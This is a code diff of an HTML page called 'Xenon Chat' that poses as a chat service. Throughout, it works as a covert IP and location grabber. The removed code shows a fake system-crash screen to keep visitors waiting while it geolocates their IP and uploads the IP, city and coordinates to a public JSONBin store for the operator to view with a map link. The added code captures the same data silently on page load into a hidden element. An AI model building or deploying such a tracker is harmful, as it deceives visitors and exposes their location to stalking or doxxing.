@@ -5,193 +5,172 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xenon Chat</title>
     <style>
-        body, html { margin:0; padding:0; height:100%; background:#000; color:#0f0; font-family:monospace; overflow:hidden; cursor:default; }
-        #landing { position:absolute; inset:0; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; background:#000; }
-        #frozen { position:absolute; inset:0; display:none; background:#000; color:#222; font-size:1.1rem; justify-content:center; align-items:center; flex-direction:column; line-height:1.8; white-space:pre; user-select:none; pointer-events:none; }
-        .glitch { color:#0f0; font-size:4.5rem; letter-spacing:12px; animation:glitch 4s infinite; text-shadow:0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
-        @keyframes glitch { 0%,100% {text-shadow:0.05em 0 0 #f00,-0.03em -0.04em 0 #0ff,0.025em 0.04em 0 #f0f;} 20% {text-shadow:-0.05em -0.025em 0 #f00,0.025em 0.035em 0 #0ff,-0.05em -0.05em 0 #f0f;} 40% {text-shadow:0.05em 0.035em 0 #f00,0.03em 0 0 #0ff,0 0.08em 0 #f0f;} }
-        button.enter { margin-top:80px; background:transparent; border:2px solid #0f0; color:#0f0; font-size:2.2rem; padding:20px 60px; font-family:monospace; cursor:pointer; transition:all 0.4s; letter-spacing:4px; }
-        button.enter:hover { background:#0f0; color:#000; box-shadow:0 0 40px #0f08; }
-        #frozen p { margin:8px 0; opacity:0.7; }
-        .blink { animation:blink 1.2s step-end infinite; }
-        @keyframes blink { 50% {opacity:0;} }
-        #ip-view { position:absolute; inset:0; background:#000; color:#0f0; display:none; flex-direction:column; justify-content:center; align-items:center; padding:20px; box-sizing:border-box; font-size:1.8rem; text-align:center; }
-        #ip-display { font-size:3rem; letter-spacing:3px; margin:20px 0; word-break:break-all; max-width:90%; }
-        #geo { font-size:2rem; color:#0f8; margin:20px 0; }
-        #maplink { font-size:1.6rem; color:#0ff; margin:40px 0; text-decoration:none; }
-        #maplink:hover { text-decoration:underline; }
-        #status { font-size:1.2rem; color:#555; margin-top:40px; text-align:center; max-width:90%; }
-        #hint { position:fixed; bottom:10px; right:10px; font-size:0.7rem; color:#444; opacity:0.4; pointer-events:none; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        #landing {
+            text-align: center;
+        }
+        .glitch {
+            font-size: 5rem;
+            letter-spacing: 15px;
+            animation: glitch 3s infinite;
+            text-shadow: 2px 0 #f00, -2px 0 #0ff;
+        }
+        @keyframes glitch {
+            0%,100% { text-shadow: 2px 0 #f00, -2px 0 #0ff; }
+            20% { text-shadow: -2px 0 #f00, 2px 0 #0ff; }
+            40% { text-shadow: 2px 0 #0f0, -2px 0 #f0f; }
+        }
+        #hidden-data {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        #ip-view {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            max-width: 90%;
+        }
+        #ip-display {
+            font-size: 2.8rem;
+            word-break: break-all;
+            margin: 20px 0;
+        }
+        #geo {
+            font-size: 2rem;
+            color: #0f8;
+            margin: 20px 0;
+        }
+        #maplink {
+            font-size: 1.5rem;
+            color: #0ff;
+            text-decoration: none;
+        }
+        #status {
+            font-size: 1.2rem;
+            color: #555;
+            margin-top: 50px;
+        }
     </style>
 </head>
 <body>
 
     <div id="landing">
         <div class="glitch">XENON CHAT</div>
-        <button class="enter" onclick="enterXenon()">ENTER</button>
+        <p style="margin-top: 60px; font-size: 1.6rem;">loading shadow node...</p>
     </div>
 
-    <div id="frozen">
-        <p>SYSTEM FAILURE - CRITICAL ERROR 0x0000007B</p>
-        <p>INACCESSIBLE_BOOT_DEVICE</p>
-        <p class="blink">[KERNEL_PANIC] Xenon subsystem frozen @ 0000:0000</p>
-        <p>Memory dump in progress... 47% complete</p>
-        <p>Corrupted sector chain detected → attempting recovery loop</p>
-        <p>█▓▓▓▓▓░░░░░░░░░░  0xDEADBEEF overflow</p>
-        <p style="margin-top:60px; font-size:1.4rem; color:#0f0;">connecting to shared shadow node...</p>
-        <p style="font-size:0.9rem; opacity:0.5;">(do not close this window - data sync in background)</p>
-        <div id="hint">F12 → Console shows room code & logs</div>
-    </div>
+    <!-- Hidden text that holds the captured data -->
+    <div id="hidden-data"></div>
 
     <div id="ip-view">
         <div>SHADOW NODE DATA</div>
         <div id="ip-display">—</div>
         <div id="geo">—</div>
         <a id="maplink" href="#" target="_blank" style="display:none;">→ EXACT COORDINATES</a>
-        <div id="status">syncing...</div>
+        <div id="status">data loaded from hidden node</div>
     </div>
 
     <script>
-        // Switched to JSONBin.io - free, no auth for public bins, reliable in 2026
-        // We use a fixed public bin per room (create if not exists via PUT/POST)
-        const JSONBIN_BASE = "https://api.jsonbin.io/v3/b/";
-        let BIN_ID = localStorage.getItem("xenon_bin") || ""; // we'll create once
+        const hiddenEl = document.getElementById("hidden-data");
+        const ipView = document.getElementById("ip-view");
 
-        let ROOM = localStorage.getItem("xenon_room") || "";
-        if (!ROOM) {
-            ROOM = "xenon-" + Math.random().toString(36).slice(2, 9);
-            localStorage.setItem("xenon_room", ROOM);
-        }
-        console.log("%cRoom code (share this): %s", "color:#0f0;font-size:16px;", ROOM);
-
-        function enterXenon() {
-            document.getElementById("landing").style.display = "none";
-            document.getElementById("frozen").style.display = "flex";
-            setTimeout(captureAndUpload, 12000);
-        }
-
-        async function createOrGetBin() {
-            if (BIN_ID) return BIN_ID;
-
+        async function captureIP() {
             try {
-                const res = await fetch(JSONBIN_BASE, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json", "private": "false" }, // public bin
-                    body: JSON.stringify({ ip: "init", geo: {}, ts: Date.now() }) // dummy init
-                });
-                if (res.ok) {
-                    const data = await res.json();
-                    BIN_ID = data.id;
-                    localStorage.setItem("xenon_bin", BIN_ID);
-                    console.log("Created new public bin:", BIN_ID);
-                    return BIN_ID;
-                } else {
-                    console.error("Bin creation failed:", res.status);
-                }
-            } catch (e) {
-                console.error("Bin create error:", e);
-            }
-            return null;
-        }
-
-        async function captureAndUpload() {
-            try {
-                console.log("Starting capture...");
-                const ipRes = await fetch("https://api.ipify.org?format=json");
+                // Get public IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
-                console.log("Captured IP:", ip);
 
-                let geo = {};
-                try {
-                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                // Get geo (using free no-key API)
+                let geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                let geo = await geoRes.json();
+
+                if (geo.error) {
+                    geoRes = await fetch(`https://ip-api.com/json/${ip}`);
                     geo = await geoRes.json();
-                } catch {}
-
-                if (geo.error || !geo.latitude) {
-                    const fallback = await fetch(`https://ip-api.com/json/${ip}`);
-                    geo = await fallback.json();
                 }
 
-                if (!geo.error && geo.status !== "fail") {
-                    const geoData = {
-                        lat: geo.lat || geo.latitude,
-                        lon: geo.lon || geo.longitude,
-                        city: geo.city || geo.regionName || "?",
-                        country: geo.country || geo.countryName || "?"
+                if (!geo.error && geo.status !== 'fail') {
+                    const data = {
+                        ip: ip,
+                        city: geo.city || geo.regionName || '?',
+                        country: geo.country || geo.countryName || '?',
+                        lat: geo.latitude || geo.lat || 0,
+                        lon: geo.longitude || geo.lon || 0,
+                        ts: Date.now()
                     };
-                    console.log("Geo data:", geoData);
 
-                    const bin = await createOrGetBin();
-                    if (!bin) return;
-
-                    const uploadRes = await fetch(JSONBIN_BASE + bin, {
-                        method: "PUT", // update/overwrite
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ ip, geo: geoData, ts: Date.now() })
-                    });
-
-                    if (uploadRes.ok) {
-                        console.log("Upload success to JSONBin!");
-                    } else {
-                        console.error("Upload failed - status:", uploadRes.status);
-                    }
+                    // Store as JSON string in hidden element
+                    hiddenEl.textContent = JSON.stringify(data);
+                    console.log("Captured & hidden:", data); // for debug
                 }
             } catch (e) {
-                console.error("Capture/upload error:", e.message);
+                console.error("Capture failed:", e);
+                hiddenEl.textContent = JSON.stringify({ error: "Capture failed" });
             }
         }
 
-        async function showIpView() {
+        function showIP() {
             document.getElementById("landing").style.display = "none";
-            document.getElementById("frozen").style.display = "none";
-            document.getElementById("ip-view").style.display = "flex";
+            ipView.style.display = "flex";
 
-            const ipEl = document.getElementById("ip-display");
-            const geoEl = document.getElementById("geo");
-            const mapEl = document.getElementById("maplink");
-            const status = document.getElementById("status");
+            const raw = hiddenEl.textContent.trim();
+            if (!raw) {
+                document.getElementById("ip-display").textContent = "NO DATA";
+                document.getElementById("status").textContent = "Nothing captured yet — load main page first";
+                return;
+            }
 
-            const update = async () => {
-                status.textContent = "Fetching from server...";
-                try {
-                    const bin = BIN_ID || await createOrGetBin(); // fallback create
-                    if (!bin) throw new Error("No bin ID");
+            try {
+                const data = JSON.parse(raw);
 
-                    const res = await fetch(JSONBIN_BASE + bin + "/latest");
-                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                    const data = await res.json();
-
-                    if (data.record && data.record.ip) {
-                        ipEl.textContent = data.record.ip;
-                        const g = data.record.geo || {};
-                        geoEl.innerHTML = `${g.city || "?"} • ${g.country || "?"}<br>${(g.lat||0).toFixed(6)}, ${(g.lon||0).toFixed(6)}`;
-                        if (g.lat && g.lon) {
-                            mapEl.href = `https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=15/${g.lat}/${g.lon}`;
-                            mapEl.style.display = "block";
-                        }
-                        status.textContent = `Room: ${ROOM} • Last capture: ${new Date(data.record.ts).toLocaleString()}`;
-                        console.log("Loaded data:", data.record);
-                    } else {
-                        ipEl.textContent = "NO DATA YET";
-                        status.textContent = "Room is empty - click ENTER on a device first";
-                    }
-                } catch (e) {
-                    ipEl.textContent = "FETCH ERROR";
-                    status.textContent = `Could not reach server: ${e.message}\n(Host online? Check console for details)`;
-                    console.error("Fetch failed:", e);
+                if (data.error) {
+                    document.getElementById("ip-display").textContent = "ERROR";
+                    document.getElementById("status").textContent = data.error;
+                    return;
                 }
-            };
 
-            await update();
-            setInterval(update, 8000);
+                document.getElementById("ip-display").textContent = data.ip;
+                document.getElementById("geo").innerHTML = `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
+
+                if (data.lat && data.lon) {
+                    const map = document.getElementById("maplink");
+                    map.href = `https://www.openstreetmap.org/?mlat=${data.lat}&mlon=${data.lon}#map=15/${data.lat}/${data.lon}`;
+                    map.style.display = "inline-block";
+                }
+
+                document.getElementById("status").textContent = `Captured at ${new Date(data.ts).toLocaleString()}`;
+            } catch (e) {
+                document.getElementById("ip-display").textContent = "PARSE ERROR";
+                document.getElementById("status").textContent = "Invalid hidden data";
+            }
         }
 
-        function checkHash() {
-            if (location.hash === "#ip") showIpView();
+        // Run capture on main load
+        captureIP();
+
+        // Check hash for #ip
+        function handleHash() {
+            if (location.hash === "#ip") {
+                showIP();
+            }
         }
 
-        window.addEventListener("hashchange", checkHash);
-        window.addEventListener("load", checkHash);
+        window.addEventListener("hashchange", handleHash);
+        window.addEventListener("load", handleHash);
     </script>
 </body>
 </html>
